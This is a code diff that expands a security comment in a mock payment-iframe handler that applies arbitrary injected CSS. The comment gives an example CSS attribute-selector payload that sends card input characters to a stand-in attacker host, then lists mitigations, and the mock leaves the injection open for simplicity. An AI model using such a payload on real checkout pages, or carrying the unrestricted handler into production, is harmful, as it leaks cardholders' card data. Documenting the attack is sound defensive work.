@@ -387,10 +387,19 @@
 
       switch (data.type) {
         case 'INJECT_STYLES': {
-          // CSS injection is a known attack surface in hosted payment pages
-          // (CSS exfiltration, expression() in legacy browsers). In production,
-          // the hosted payment page would allowlist CSS properties and use CSP
-          // headers. This mock accepts arbitrary CSS for simplicity.
+          // SECURITY: CSS injection is a known attack surface in hosted payment pages.
+          // An attacker who controls the parent page could use attribute-selector
+          // CSS exfiltration (e.g. input[value^="4"]{background:url(attacker.com/?c=4)})
+          // to leak card input values character by character.
+          //
+          // Production mitigations:
+          // 1. Allowlist CSS properties (only colors, fonts, borders, padding)
+          // 2. Reject selectors targeting input[value] or input[type]
+          // 3. CSP headers blocking external URL references in CSS
+          // 4. Serve the iframe from a separate origin with its own stylesheet
+          //
+          // This mock accepts arbitrary CSS for simplicity. style.textContent is
+          // used (not innerHTML), so HTML/JS injection is not possible here.
           const style = document.createElement('style');
           style.textContent = data.payload.styles || '';
           document.head.appendChild(style);
